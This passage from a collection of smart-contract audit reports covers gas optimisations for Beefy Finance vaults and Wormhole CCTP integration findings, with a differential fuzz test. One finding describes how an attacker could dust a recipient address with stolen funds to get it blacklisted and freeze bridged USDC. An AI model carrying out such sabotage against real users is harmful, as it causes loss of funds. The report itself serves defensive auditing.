453:        (uint128 liquidity,,,uint256 owed0, uint256 owed1) = IUniswapV3Pool(pool).positions(keyMain);
454:        (uint128 altLiquidity,,,uint256 altOwed0, uint256 altOwed1) =IUniswapV3Pool(pool).positions(keyAlt);

// @audit cache `pool` to save 2 storage reads
562:        if (msg.sender != pool) revert NotPool();
565:        if (amount0 > 0) IERC20Metadata(lpToken0).safeTransfer(pool, amount0);
566:        if (amount1 > 0) IERC20Metadata(lpToken1).safeTransfer(pool, amount1);

// @audit cache `twapInterval` to save 1 storage read
696:        secondsAgo[0] = uint32(twapInterval);
700:        twapTick = (tickCuml[1] - tickCuml[0]) / twapInterval;
```

File: `BeefyQIVault.sol`
```solidity
// @audit cache `rewardTokens[i]` to save 2 storage reads
211:                        uint256 bal = IERC20(rewardTokens[i]).balanceOf(address(this));
212:                        if (bal > 0 && rewardTokens[i] != native) {
213:                                BeefyBalancerStructs.Reward storage reward = rewards[rewardTokens[i]];

// @audit cache `rewardTokens[i]` to save 2 storage reads
371:                        IERC20(rewardTokens[i]).approve(rewards[rewardTokens[i]].router, 0);
372:                        delete rewards[rewardTokens[i]];

// @audit cache 'rewardPool` to save 1 storage read
390:                emit UpdatedRewardPool(rewardPool, _rewardPool);
392:                IERC20(qibpt).approve(rewardPool, 0);
```

**Beefy:**
Acknowledged.


### Storage variables only assigned once in the constructor can be declared immutable

**Description:** Storage variables which are only assigned once in the constructor can be declared immutable:

File: `StrategyFactory.sol`
```solidity
address public keeper;
```

File: `BeefyVaultConcLiqFactory.sol`
```solidity
BeefyVaultConcLiq public instance;
```

**Beefy:**
Acknowledged.


### Cache array length outside of loops and consider unchecked loop incrementing

**Description:** Cache array length outside of loops and consider using `unchecked {++i;}` if not compiling with `solc --ir-optimized --optimize`:

File: `BeefyQIVault.sol`
```solidity
210:                for (uint i; i < rewardTokens.length; ++i) {
216:                                        for (uint j; j < reward.assets.length - 1;) {
358:                        for (uint i; i < _swapInfo.length; ++i) {
370:                for (uint256 i; i < rewardTokens.length; ++i) {
```

**Beefy:**
Acknowledged.


### Optimize `StrategyPassiveManagerUniswap::_chargeFees` to remove unnecessary variables and eliminate duplicate storage reads

**Description:** `StrategyPassiveManagerUniswap::_chargeFees` uses two unnecessary variables `out0` and `out1` and reads the same storage values from `lpToken0`, `lpToken` and `native` multiple times. A more optimized version of the relevant section looks like this:

```solidity
// @audit cache `native` to prevent duplicate storage reads
address nativeCached = native;

/// We calculate how much to swap and then swap both tokens to native and charge fees.
uint256 nativeEarned;
if (_amount0 > 0) {
    // Calculate amount of token 0 to swap for fees.
    uint256 amountToSwap0 = _amount0 * fees.total / DIVISOR;
    _amountLeft0 = _amount0 - amountToSwap0;

    // @audit next section refactored
    // If token0 is not native, swap to native the fee amount.
    if (lpToken0 != nativeCached) nativeEarned += UniV3Utils.swap(unirouter, lpToken0ToNativePath, amountToSwap0);

    // Add the native earned to the total of native we earned for beefy fees, handle if token0 is native.
    else nativeEarned += amountToSwap0;
}

if (_amount1 > 0) {
    // Calculate amount of token 1 to swap for fees.
    uint256 amountToSwap1 = _amount1 * fees.total / DIVISOR;
    _amountLeft1 = _amount1 - amountToSwap1;

    // @audit next section refactored
    // Add the native earned to the total of native we earned for beefy fees, handle if token1 is native.
    if (lpToken1 != nativeCached) nativeEarned += UniV3Utils.swap(unirouter, lpToken1ToNativePath, amountToSwap1);

    // Add the native earned to the total of native we earned for beefy fees, handle if token1 is native.
    else nativeEarned += amountToSwap1;
}

// @audit then use `nativeCached` in the transfers eg:
IERC20Metadata(nativeCached).safeTransfer(_callFeeRecipient, callFeeAmount);
```

**Beefy:**
Acknowledged.


### Don't call `_tickDistance` twice in `StrategyPassiveManagerUniswap::_setMainTick`

**Description:** `StrategyPassiveManagerUniswap::_setMainTick` calls `_tickDistance` twice even though there is no need since the exact same value will be returned; replace the second call with the `distance` variable which caches the result of the first call like so:
```solidity
    function _setMainTick() private {
        int24 tick = currentTick();
        int24 distance = _tickDistance();
        int24 width = positionWidth * distance;
        (positionMain.tickLower, positionMain.tickUpper) = TickUtils.baseTicks(
            tick,
            width,
            // @audit use cached result from first call
            distance                 // _tickDistance()
        );
    }
```

**Beefy:**
Fixed in commit [e7723da](https://github.com/beefyfinance/experiments/commit/e7723daf27d39ae013507191aa67e111f3af05e4).

**Cyfrin:** Verified.


### In `StrategyPassiveManagerUniswap` public functions should cache common inputs then pass them as parameters to private functions

**Description:** `StrategyPassiveManagerUniswap` has many private functions which read the same values from storage multiple times without changing them. Since reading from storage is gas expensive, these values could be read from storage once then passed into private functions as inputs.

Example 1 - `StrategyPassiveManagerUniswap::_setMainTick` and `_setAltTick` use many of the same inputs; instead of reading them from storage multiple times, read them once inside `_setTicks` then pass them in as input parameters to `_setMainTick, _setAltTick`:

```solidity
function _setTicks() private {
    // @audit reading inputs only once
    int24 currTick = currentTick();
    int24 distance = _tickDistance();
    int24 width    = positionWidth * distance;

    // @audit passing inputs as parameters to avoid
    // multiple identical storage reads
    _setMainTick(currTick, distance, width);
    _setAltTick(currTick, distance, width);
}
```

Example 2 - `beforeAction` calls `_claimEarnings` and `_removeLiquidity`. Both of these private functions read `pool`, `positionMain` and `positionAlt` from storage but don't modify these storage locations. Hence `beforeAction` could read these values from storage once then pass them in as inputs to `_claimEarnings` and `_removeLiquidity` in order to save many useless but expensive storage reads.

**Beefy:**
Fixed in commit [ce5f798](https://github.com/beefyfinance/experiments/commit/ce5f7986372cd2e32e58b1a03e0693d42b4b1ce0).

**Cyfrin:** Verified.


### Avoid unnecessary initialization to zero in `BeefyVaultConcLiq::deposit`

**Description:** `BeefyVaultConcLiq::deposit` declares the `shares` variable on [L127](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L157) initializing it to zero even though the `shares` variable is first used later in [L172](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L172).

Avoid unnecessary initialization to zero by declaring and initializing `shares` at the same time in L172:
```solidity
uint256 shares = _amount1 + (_amount0 * price / PRECISION);
```

**Beefy:**
Fixed in commit [ea3aca8](https://github.com/beefyfinance/experiments/commit/ea3aca890816ea86f84ab721e6aa8993a591f061).

**Cyfrin:** Verified.


### Fail fast in `BeefyVaultConcLiq:withdraw`

**Description:** In `BeefyVaultConcLiq:withdraw` the `minAmount0` and `minAmount1` [slippage check](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L225) should be before the call to `strategy.withdraw`, because there's no point in doing the additional processing if the function is going to revert. Make it like this:
```solidity
uint256 _amount0 = (_bal0 * _shares) / _totalSupply;
uint256 _amount1 = (_bal1 * _shares) / _totalSupply;

// @audit fail fast
if (_amount0 < _minAmount0 || _amount1 < _minAmount1) revert TooMuchSlippage();

strategy.withdraw(_amount0, _amount1);
```

**Beefy:**
Acknowledged.


### Use `calldata` instead of `memory` for function arguments that do not get mutated

**Description:** Use `calldata` instead of `memory` for function arguments that do not get mutated:

File:BeefyVaultConcLiq.sol
```solidity
47:        string memory _name,
48:        string memory _symbol
```

**Beefy:**
Fixed in commit [8349866](https://github.com/beefyfinance/experiments/commit/8349866c048412ec4c395eb0666b9e5aad6d6447).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-04-06-cyfrin-beefy-finance.md ------


------ FILE START car/reports_md/2024-04-09-cyfrin-wormhole-evm-cctp-v2-1.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**

[Hans](https://twitter.com/hansfriese)


---

# Findings
## Medium Risk


### Redemptions are blocked when L2 sequencers are down

**Description:** Given that rollups such as [Optimism](https://docs.optimism.io/chain/differences#address-aliasing) and [Arbitrum](https://docs.arbitrum.io/arbos/l1-to-l2-messaging#address-aliasing) offer methods for forced transaction inclusion, it is important that the aliased sender address is also [checked](https://solodit.xyz/issues/m-8-operator-is-blocked-when-sequencer-is-down-on-arbitrum-sherlock-none-index-git) within [`Logic::redeemTokensWithPayload`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Logic.sol#L88-L91) when verifying the sender is the specified `mintRecipient` to allow for maximum uptime in the event of sequencer downtime.

```solidity
// Confirm that the caller is the `mintRecipient` to ensure atomic execution.
require(
    msg.sender.toUniversalAddress() == deposit.mintRecipient, "caller must be mintRecipient"
);
```

**Impact:** Failure to consider the aliased `mintRecipient` address prevents the execution of valid VAAs on a target CCTP domain where transactions are batched by a centralized L2 sequencer. Since this VAA could carry a time-sensitive payload, such as the urgent cross-chain liquidity infusion to a protocol, this issue has the potential to have a high impact with reasonable likelihood.

**Proof of Concept:**
1. Protocol X attempts to transfer 10,000 USDC from CCTP Domain A to CCTP Domain B.
2. CCTP Domain B is an L2 rollup that batches transactions for publishing onto the L1 chain via a centralized sequencer.
3. The L2 sequencer goes down; however, transactions can still be executed via forced inclusion on the L1 chain.
4. Protocol X implements the relevant functionality and attempts to redeem 10,000 USDC via forced inclusion.
5. The Wormhole CCTP integration does not consider the contract's aliased address when validating the `mintRecipient`, so the redemption fails.
6. Cross-chain transfer of this liquidity will remain blocked so long as the sequencer is down.

**Recommended Mitigation:** Validation of the sender address against the `mintRecipient` should also consider the aliased `mintRecipient` address to allow for maximum uptime when [`Logic::redeemTokensWithPayload`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Logic.sol#L88-L91) is called via forced inclusion.

**Wormhole Foundation:** Since CCTP [doesnt deal with this aliasing](https://github.com/circlefin/evm-cctp-contracts/blob/adb2a382b09ea574f4d18d8af5b6706e8ed9b8f2/src/MessageTransmitter.sol#L270-L277), we dont feel strongly that we should either.

**Cyfrin:** Acknowledged.


### Loss of funds due to malicious forcing of `mintRecipient` onto Circle blacklist when CCTP message is in-flight

**Description:** A scenario has been identified in which it may not be possible for the `mintRecipient` to execute redemption on the target domain due to the actions of a bad actor while an otherwise valid CCTP message is in-flight. It is ostensibly the responsibility of the user to correctly configure the `mintRecipient`; however, one could reasonably assume the case where an attacker dusts the `mintRecipient` address with funds stolen in a recent exploit, that may have been deposited to and subsequently withdrawn from an external protocol, or an OFAC-sanctioned token such as TORN, to force this address to become blacklisted by Circle on the target domain while the message is in-flight, thereby causing both the original sender and their intended target recipient to lose access to the tokens.

In the current design, it is not possible to update the `mintRecipient` for a given deposit due to the multicast nature of VAAs. CCTP exposes [`MessageTransmitter::replaceMessage`](https://github.com/circlefin/evm-cctp-contracts/blob/1662356f9e60bb3f18cb6d09f95f628f0cc3637f/src/MessageTransmitter.sol#L129-L181) which allows the original source caller to update the destination caller for a given message and its corresponding attestation; however, the Wormhole CCTP integration currently provides no access to this function and has no similar functionality of its own to allow updates to the target `mintRecipient` of the VAA. Without any method for replacing potentially affected VAAs with new VAAs specifying an updated `mintRecipient`, this could result in permanent denial-of-service on the `mintRecipient` receiving tokens on the target domain  the source USDC/EURC will be burnt, but it may be very unlikely that the legitimate recipient is ever able to mint the funds on the destination domain, and once the tokens are burned, there is no path to recovery on the source domain.

This type of scenario is likely to occur primarily where a bad actor intentionally attempts to sabotage a cross-chain transfer of funds that the source caller otherwise expects to be successful. A rational actor would not knowingly attempt a cross-chain transfer to a known blacklisted address, especially if the intended recipient is not a widely-used protocol, which tend to be exempt from sanctions even when receiving funds from a known attacker, but rather an independent EOA. In this case, the destination call to [`Logic::redeemTokensWithPayload`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Logic.sol#L61-L108) will fail when the CCTP contracts attempt to mint the tokens and can only be retried if the `mintRecipient` address somehow comes back off the Circle blacklist, the [mechanics of which](https://www.circle.com/hubfs/Blog%20Posts/Circle%20Stablecoin%20Access%20Denial%20Policy_pdf.pdf) are not overly clear. It is also possible that request(s) made by law-enforcement agencies for the blacklisting of an entire protocol X, as the mint recipient on target domain Y, will cause innocent users to also lose access to their bridged funds.

It is understood that the motivation for restricting message replacement functionality is due to the additional complexity in handling this edge case and ensuring that the VAA of the original message cannot be redeemed with the replaced CCTP attestation, given the additional attack surface. Given that it is not entirely clear how the Circle blacklisting policy would apply in this case, it would be best for someone with the relevant context to aid in making the decision based on this cost/benefit analysis. If it is the case that a victim can be forced onto the blacklist without a clear path to resolution, then this clearly is not ideal. Even if they are eventually able to have this issue resolved, the impact could be time-sensitive in nature, thinking in the context of cross-chain actions that may need to perform some rebalancing/liquidation function, plus a sufficiently motivated attacker could potentially repeatedly front-run any subsequent attempts at minting on the target domain. It is not entirely clear how likely this final point is in practice, once the messages are no longer in-flight and simply ready for execution on the destination, since it is assumed the blacklist would not likely be updated that quickly. In any case, it is agreed that allowing message replacement will add a non-trivial amount of complexity and does indeed increase the attack surface, as previously identified. So depending on how the blacklist is intended to function, it may be worth allowing message replacement, but it is not possible to say with certainty whether this issue is worth addressing.

**Impact:** There is only a single address that is permitted to execute a given VAA on the target domain; however, there exists a scenario in which this `mintReceipient` may be permanently unable to perform redemption due to the malicious addition of this address to the Circle blacklist. In this case, there is a material loss of funds with reasonable likelihood.

**Proof of Concept:**
1. Alice burns 10,000 USDC on CCTP Domain A to be transferred to her EOA on CCTP Domain B.
2. While this CCTP message is in-flight, an attacker withdraws a non-trivial amount of USDC, that was previously obtained from a recent exploit, from protocol X to Alice's EOA on CCTP domain B.
3. Law enforcement notifies Circle to blacklist Alice's EOA, which now holds stolen funds.
4. Alice attempts to redeem 10,000 USDC on CCTP Domain B, but minting fails because her EOA is now blacklisted on the USDC contract.
5. The 10,000 USDC remains burnt and cannot be minted on the target domain since the VAA containing the attested CCTP message can never be executed without the USDC mint reverting.

**Recommended Mitigation:** Consider allowing VAAs to be replaced by new VAAs for a given CCTP message and corresponding attestation, so long as they have not already been consumed on the target domain. Alternatively, consider adding an additional Governance action dedicated to the purpose of recovering the USDC burnt by a VAA that has not yet been consumed on the target domain due to malicious blacklisting.

**Wormhole Foundation:** Although CCTP has the ability to replace messages, it is also subject to this same issue since the original message recipient [cant be changed](https://github.com/circlefin/evm-cctp-contracts/blob/adb2a382b09ea574f4d18d8af5b6706e8ed9b8f2/src/MessageTransmitter.sol#L170-L175).

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Potentially dangerous out-of-bounds memory access in `BytesParsing::sliceUnchecked`

**Description:** [`BytesParsing::sliceUnchecked`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/libraries/BytesParsing.sol#L16-L57) currently[ bails early](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/libraries/BytesParsing.sol#L21-L24) for the degenerate case when the slice length is zero; however, there is no validation on the length of the encoded bytes parameter `encoded` itself. If the length of `encoded` is less than the slice `length`, then it is possible to access memory out-of-bounds.

```solidity
function sliceUnchecked(bytes memory encoded, uint256 offset, uint256 length)
    internal
    pure
    returns (bytes memory ret, uint256 nextOffset)
{
    //bail early for degenerate case
    if (length == 0) {
        return (new bytes(0), offset);
    }

    assembly ("memory-safe") {
        nextOffset := add(offset, length)
        ret := mload(freeMemoryPtr)

        /* snip: inline dev comments */

        let shift := and(length, 31) //equivalent to `mod(length, 32)` but 2 gas cheaper
        if iszero(shift) { shift := wordSize }

        let dest := add(ret, shift)
        let end := add(dest, length)
        for { let src := add(add(encoded, shift), offset) } lt(dest, end) {
            src := add(src, wordSize)
            dest := add(dest, wordSize)
        } { mstore(dest, mload(src)) }

        mstore(ret, length)
        //When compiling with --via-ir then normally allocated memory (i.e. via new) will have 32 byte
        //  memory alignment and so we enforce the same memory alignment here.
        mstore(freeMemoryPtr, and(add(dest, 31), not(31)))
    }
}
```

Since the `for` loop begins at the offset of `encoded` in memory, accounting for its length and accompanying `shift` calculation depending on the `length` supplied, and execution continues so long as `dest` is less than `end`, it is possible to continue loading additional words out of bounds simply by passing larger `length` values. Therefore, regardless of the length of the original bytes, the output slice will always have a size defined by the `length` parameter.

It is understood that this is known behavior due to the unchecked nature of this function and the accompanying checked version, which performs validation on the `nextOffset` return value compared with the length of the encoded bytes.

```solidity
function slice(bytes memory encoded, uint256 offset, uint256 length)
    internal
    pure
    returns (bytes memory ret, uint256 nextOffset)
{
    (ret, nextOffset) = sliceUnchecked(encoded, offset, length);
    checkBound(nextOffset, encoded.length);
}
```

It has not been possible within the constraints of this review to identify a valid scenario in which malicious calldata can make use of this behavior to launch a successful exploit; however, this is not a guarantee that the usage of this library function is bug-free since there do [exist](https://solodit.xyz/issues/h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute-code4rena-mimo-defi-mimo-august-2022-contest-git) [certain](https://solodit.xyz/issues/m-2-high-risk-checks-can-be-bypassed-with-extra-calldata-padding-sherlock-olympus-on-chain-governance-git) [quirks](https://solodit.xyz/issues/opcalldataload-opcalldatacopy-reading-position-out-of-calldata-bounds-spearbit-none-polygon-zkevm-pdf) related to the loading of calldata.

**Impact:** The impact is limited in the context of the library function's usage in the scope of this review; however, it is advisable to check any other usage elsewhere and in the future to ensure that this behavior cannot be weaponized. `BytesParsing::sliceUnchecked` is currently only used in [`WormholeCctpMessages::_decodeBytes`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/libraries/WormholeCctpMessages.sol#L227-L235), which itself is called in [`WormholeCctpMessages::decodeDeposit`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/libraries/WormholeCctpMessages.sol#L196-L223). This latter function is utilized in two places:
1. [`Logic::decodeDepositWithPayload`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Logic.sol#L126-L148): here, any issues in slicing the encoded bytes would impact users' ability to decode payloads, potentially stopping them from correctly retrieving the necessary information for redemptions.
2. [`WormholeCctpTokenMessenger::verifyVaaAndMint`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/WormholeCctpTokenMessenger.sol#L144-L197)/[`WormholeCctpTokenMessenger::verifyVaaAndMintLegacy`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/WormholeCctpTokenMessenger.sol#L199-L253): these functions verify and reconcile CCTP and Wormhole messages in order to mint tokens for the encoded mint recipient. Fortunately, for a malicious calldata payload, Wormhole itself will revert when [`IWormhole::parseAndVerifyVM`](https://github.com/wormhole-foundation/wormhole/blob/eee4641f55954d2d0db47831688a2e97eb20f7ee/ethereum/contracts/Messages.sol#L15-L20) is called via [`WormholeCctpTokenMessenger::_parseAndVerifyVaa`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/WormholeCctpTokenMessenger.sol#L295-L311) since it will be unable to [retrieve a valid version number](https://github.com/wormhole-foundation/wormhole/blob/main/ethereum/contracts/Messages.sol#L150) when [casting](https://github.com/wormhole-foundation/wormhole/blob/main/ethereum/contracts/libraries/external/BytesLib.sol#L309) to `uint8`.

**Proof of Concept:** Apply the following git diff to differential test against a Python implementation:
```diff
diff --git a/evm/.gitignore b/evm/.gitignore
--- a/evm/.gitignore
+++ b/evm/.gitignore
@@ -7,3 +7,4 @@ lib
 node_modules
 out
 ts/src/ethers-contracts
+venv/
diff --git a/evm/forge/tests/differential/BytesParsing.t.sol b/evm/forge/tests/differential/BytesParsing.t.sol
new file mode 100644
--- /dev/null
+++ b/evm/forge/tests/differential/BytesParsing.t.sol
@@ -0,0 +1,72 @@
+// SPDX-License-Identifier: Apache 2
+pragma solidity ^0.8.19;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import {BytesParsing} from "src/libraries/BytesParsing.sol";
+
+contract BytesParsingTest is Test {
+    using BytesParsing for bytes;
+
+    function setUp() public {}
+
+    function test_sliceUncheckedFuzz(bytes memory encoded, uint256 offset, uint256 length) public {
+        bound(offset, 0, type(uint8).max);
+        bound(length, 0, type(uint8).max);
+        if (offset > encoded.length || length > encoded.length || offset + length > encoded.length) {
+            return;
+        }
+
+        sliceUncheckedBase(encoded, offset, length);
+    }
+
+    function test_sliceUncheckedConcreteReadOOB() public {
+        bytes memory encoded = bytes("");
+        bytes32 dirty = 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef;
+        assembly {
+            mstore(add(encoded, 0x20), dirty)
+        }
+        uint256 offset = 0;
+        uint256 length = 32;
+
+        sliceUncheckedBase(encoded, offset, length);
+    }
+
+    function sliceUncheckedBase(bytes memory encoded, uint256 offset, uint256 length)
+        internal
+        returns (
+            bytes memory soliditySlice,
+            uint256 solidityNextOffset,
+            bytes memory pythonSlice,
+            uint256 pythonNextOffset
+        )
+    {
+        (soliditySlice, solidityNextOffset) = encoded.sliceUnchecked(offset, length);
+        assertEq(soliditySlice.length, length, "wrong length");
+
+        string[] memory inputs = new string[](9);
+        inputs[0] = "python";
+        inputs[1] = "forge/tests/differential/python/bytes_parsing.py";
+        inputs[2] = "slice_unchecked";
+        inputs[3] = "--encoded";
+        inputs[4] = vm.toString(encoded);
+        inputs[5] = "--offset";
+        inputs[6] = vm.toString(offset);
+        inputs[7] = "--length";
+        inputs[8] = vm.toString(length);
+
+        (pythonSlice, pythonNextOffset) = abi.decode(vm.ffi(inputs), (bytes, uint256));
+
+        emit log_named_uint("soliditySlice.length", soliditySlice.length);
+        emit log_named_uint("pythonSlice.length", pythonSlice.length);
+
+        emit log_named_bytes("soliditySlice", soliditySlice);
+        emit log_named_bytes("pythonSlice", pythonSlice);
+        emit log_named_uint("solidityNextOffset", solidityNextOffset);
+        emit log_named_uint("pythonNextOffset", pythonNextOffset);
+
+        assertEq(soliditySlice, pythonSlice, "wrong slice");
+        assertEq(solidityNextOffset, pythonNextOffset, "wrong next offset");
+    }
+}
diff --git a/evm/forge/tests/differential/python/bytes_parsing.py b/evm/forge/tests/differential/python/bytes_parsing.py
new file mode 100644
--- /dev/null
+++ b/evm/forge/tests/differential/python/bytes_parsing.py
@@ -0,0 +1,42 @@
+from eth_abi import encode
+import argparse
+
+
+def main(args):
+    if args.function == "slice_unchecked":
+        slice, next_offset = slice_unchecked(args)
+        encode_and_print(slice, next_offset)
+
+
+def slice_unchecked(args):
+    if args.length == 0:
+        return (b"", args.offset)
+
+    next_offset = args.offset + args.length
+
+    encoded_bytes = (
+        bytes.fromhex(args.encoded[2:])
+        if args.encoded.startswith("0x")
+        else bytes.fromhex(args.encoded)
+    )
+    return (encoded_bytes[args.offset : next_offset], next_offset)
+
+
+def encode_and_print(slice, next_offset):
+    encoded_output = encode(["bytes", "uint256"], (slice, next_offset))
+    ## append 0x for FFI parsing
+    print("0x" + encoded_output.hex())
+
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("function", choices=["slice_unchecked"])
+    parser.add_argument("--encoded", type=str)
+    parser.add_argument("--offset", type=int)
+    parser.add_argument("--length", type=int)
+    return parser.parse_args()
+
+
+if __name__ == "__main__":
+    args = parse_args()
+    main(args)
diff --git a/evm/forge/tests/differential/python/requirements.txt b/evm/forge/tests/differential/python/requirements.txt
new file mode 100644
--- /dev/null
+++ b/evm/forge/tests/differential/python/requirements.txt
@@ -0,0 +1 @@
+eth_abi==5.0.0
\ No newline at end of file
diff --git a/evm/foundry.toml b/evm/foundry.toml
--- a/evm/foundry.toml
+++ b/evm/foundry.toml
@@ -31,4 +31,7 @@ gas_reports = ["*"]

 gas_limit = "18446744073709551615"

+[profile.ffi]
+ffi = true
+
```

**Recommended Mitigation:** Consider bailing early if the length of the bytes from which to construct a slice is zero, and always ensure the resultant offset is correctly validated against the length when using the unchecked version of the function.

**Wormhole Foundation:** The[slicemethod](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/7599cbe984ce17dd9e87c81fb0b6ea12ff1635ba/evm/src/libraries/BytesParsing.sol#L59) does this checking for us. Since were controlling the length specified in the wire format, we can safely use the unchecked variant.

**Cyfrin:** Acknowledged.


### A given CCTP domain can be registered for multiple foreign chains due to insufficient validation in `Governance::registerEmitterAndDomain`

**Description:** [`Governance::registerEmitterAndDomain`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Governance.sol#L48-L84) is a Governance action that is used to register the emitter address and corresponding CCTP domain for a given foreign chain. Validation is currently performed to ensure that the registered CCTP domain of the foreign chain is not equal to that of the local chain; however, there is no such check to ensure that the given CCTP domain has not already been registered for a different foreign chain. In this case, where the CCTP domain of an existing foreign chain is mistakenly used in the registration of a new foreign chain, the [`getDomainToChain`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Governance.sol#L83) mapping of an existing CCTP domain will be overwritten to the most recently registered foreign chain. Given the validation that prevents foreign chains from being registered again, without a method for updating an already registered emitter, it will not be possible to correct this corruption of state.

```solidity
function registerEmitterAndDomain(bytes memory encodedVaa) public {
    /* snip: parsing of Governance VAA payload */

    // For now, ensure that we cannot register the same foreign chain again.
    require(registeredEmitters[foreignChain] == 0, "chain already registered");

    /* snip: additional parsing of Governance VAA payload */

    // Set the registeredEmitters state variable.
    registeredEmitters[foreignChain] = foreignAddress;

    // update the chainId to domain (and domain to chainId) mappings
    getChainToDomain()[foreignChain] = cctpDomain;
    getDomainToChain()[cctpDomain] = foreignChain;
}
```

**Impact:** The impact of this issue in the current scope is limited since the corrupted state is only ever queried in a public view function; however, if it is important for third-party integrators, then this has the potential to cause downstream issues.

**Proof of Concept:**
1. CCTP Domain A is registered for foreign chain identifier X.
2. CCTP Domain A is again registered, this time for foreign chain identifier Y.
3. The `getDomainToChain` mapping for CCTP Domain A now points to foreign chain identifier Y, while the `getChainToDomain` mapping for both X and Y now points to CCTP domain A.

**Recommended Mitigation:** Consider adding the following validation when registering a CCTP domain for a foreign chain:

```diff
+ require (getDomainToChain()[cctpDomain] == 0, "CCTP domain already registered for a different foreign chain");
```

**Wormhole Foundation:** We are comfortable that governance messages are sufficiently validated before being signed by the guardians and submitted on-chain.

**Cyfrin:** Acknowledged.


### Lack of Governance action to update registered emitters

**Description:** The Wormhole CCTP integration contract currently exposes a function [`Governance::registerEmitterAndDomain`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Governance.sol#L48-L84) to register an emitter address and its corresponding CCTP domain on the given foreign chain; however, no such function currently exists to update this state. Any mistake made when registering the emitter and CCTP domain is irreversible unless an upgrade is performed on the entirety of the integration contract itself. Deployment of protocol upgrades comes with its own risks and should not be performed as a necessary fix for trivial human errors. Having a separate governance action to update the emitter address, foreign chain identifier, and CCTP domain is a preferable pre-emptive measure against any potential human errors.

```solidity
function registerEmitterAndDomain(bytes memory encodedVaa) public {
    /* snip: parsing of Governance VAA payload */

    // Set the registeredEmitters state variable.
    registeredEmitters[foreignChain] = foreignAddress;

    // update the chainId to domain (and domain to chainId) mappings
    getChainToDomain()[foreignChain] = cctpDomain;
    getDomainToChain()[cctpDomain] = foreignChain;
}
```

**Impact:** In the event an emitter is registered with an incorrect foreign chain identifier or CCTP domain, then a protocol upgrade will be required to mitigate this issue. As such, the risks associated with the deployment of protocol upgrades and the potential time-sensitive nature of this issue designate a low severity issue.

**Proof of Concept:**
1. A Governance VAA erroneously registers an emitter with the incorrect foreign chain identifier.
2. A Governance upgrade is now required to re-initialize this state so that the correct foreign chain identifier can be associated with the given emitter address.

**Recommended Mitigation:** The addition of a `Governance::updateEmitterAndDomain` function is recommended to allow Governance to more easily respond to any issues with the registered emitter state.

**Wormhole Foundation:** Allowing existing emitters to be updated comes with similar impacts of admin mistakes. But allowing updates is indeed easier than coordinating a whole contract upgrade. However we wont change this since we cant easily enforce that governance messages to perform these updates are played in sequence.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Use `SafeERC20::safeIncreaseAllowance` in the place of `IERC20::approve` in `WormholeCctpTokenMessenger::setTokenMessengerApproval`

Although the `SafeERC20` library is [declared](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/bbc593d7f4caf2b59bf9de18a870e2df37ed6fd4/evm/src/contracts/WormholeCctpTokenMessenger.sol#L26) as being used for the `IERC20` interface, [`WormholeCctpTokenMessenger::setTokenMessengerApproval`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/bbc593d7f4caf2b59bf9de18a870e2df37ed6fd4/evm/src/contracts/WormholeCctpTokenMessenger.sol#L92-L98) uses `IERC20::approve` directly instead of `SafeERC20::safeApprove`. Whilst the `FiatTokenV2_2` implementation of `IERC20::approve` does return the `true` boolean, reverting otherwise, some tokens can silently fail when this function is called; therefore, it may be necessary to check the return value of this call if the protocol ever intends to work with other ERC20 tokens. Also, note that OpenZeppelin discourages the use of `SafeERC20::safeApprove` (deprecated in v5) and instead recommends the use of `safeERC20::safeIncreaseAllowance`.

**Wormhole Foundation:** Fixed in [PR \#52](https://github.com/wormhole-foundation/wormhole-circle-integration/pull/52).

